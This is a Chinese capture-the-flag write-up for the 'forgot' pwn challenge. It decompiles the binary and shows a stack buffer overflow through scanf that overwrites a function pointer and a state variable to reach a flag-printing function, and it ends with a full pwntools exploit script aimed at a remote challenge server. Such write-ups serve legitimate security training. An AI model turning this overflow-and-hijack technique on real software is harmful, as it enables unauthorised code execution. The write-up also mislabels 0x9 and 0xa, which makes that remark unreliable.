xman_pwn_forgot

反汇编发现

```c
  __isoc99_scanf("%s", &v2);
  for ( i = 0; ; ++i )
  {
    v0 = i;
    if ( v0 >= strlen((const char *)&v2) )
      break;
    switch ( v14 )
    {
      case 1:
        if ( sub_8048702(*((char *)&v2 + i)) )
          v14 = 2;
        break;
      case 2:
        if ( *((_BYTE *)&v2 + i) == 64 )
          v14 = 3;
        break;
      case 3:
        if ( sub_804874C(*((char *)&v2 + i)) )
          v14 = 4;
        break;
      case 4:
        if ( *((_BYTE *)&v2 + i) == 46 )
          v14 = 5;
        break;
      case 5:
        if ( sub_8048784(*((char *)&v2 + i)) )
          v14 = 6;
        break;
      case 6:
        if ( sub_8048784(*((char *)&v2 + i)) )
          v14 = 7;
        break;
      case 7:
        if ( sub_8048784(*((char *)&v2 + i)) )
          v14 = 8;
        break;
      case 8:
        if ( sub_8048784(*((char *)&v2 + i)) )
          v14 = 9;
        break;
      case 9:
        v14 = 10;
        break;
      default:
        continue;
    }
  }
 (*(&v3 + --v14))();
```

 `(*(&v3 + --v14))();`是函数指针调用，使v14变成10，v12变成sub_80486CC的地址就可以了(因为看到sub_80486CC这个函数里直接cat flag了)

```c
  size_t v0; // ebx
  int v2; // [esp-78h] [ebp-78h]
  int (*v3)(); // [esp-58h] [ebp-58h]
  int (*v4)(); // [esp-54h] [ebp-54h]
  int (*v5)(); // [esp-50h] [ebp-50h]
  int (*v6)(); // [esp-4Ch] [ebp-4Ch]
  int (*v7)(); // [esp-48h] [ebp-48h]
  int (*v8)(); // [esp-44h] [ebp-44h]
  int (*v9)(); // [esp-40h] [ebp-40h]
  int (*v10)(); // [esp-3Ch] [ebp-3Ch]
  int (*v11)(); // [esp-38h] [ebp-38h]
  int (*v12)(); // [esp-34h] [ebp-34h]
  int v13; // [esp-30h] [ebp-30h]
  signed int v14; // [esp-10h] [ebp-10h]
  size_t i; // [esp-Ch] [ebp-Ch]
```

> payload = 'a' * 0x44 + p32(0x080486CC) + 'a' * 0x20 + p32(0x8)

0x44:填充从v2开始填，v12到v2间隔0x44

0x20:v12地址改掉后距离v14间隔0x20

P32（0x8）：将v14在进入循环前设成0x8，由于填充字符串是a，满足`sub_8048784`函数的要求，所以循环结束时v14会被设成10，下面的函数指针的函数调用可以顺利调用到v12的函数

**这里不直接p32(0x9),p32(0xa)是因为0x9是\n,0xa是\t，p32(0x9)或者p32(0xa)之后查看内存会显示设成了ffffffff**
**有可能是因为scanf不能读入制表符（？）**

>0xff913afc:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
>0xff913b04:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
>0xff913b0c:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
>0xff913b14:	0x61	0x61	0x61	0x61	0xff	0xff	0xff	0xff

```c
解答：
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level="debug"
context.arch = "amd64"
pwn_file="./forgot"
#elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    c=process(pwn_file)
    pid=c.pid
else:
    c=remote("111.198.29.45", 41935)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


payload = 'a'*0x44 + p32(0x080486CC) + 'a'*0x20 + p32(0x8)

c.recvuntil(">")
c.sendline("bbb")
debug()
c.sendlineafter("> ", payload)

c.interactive()
```

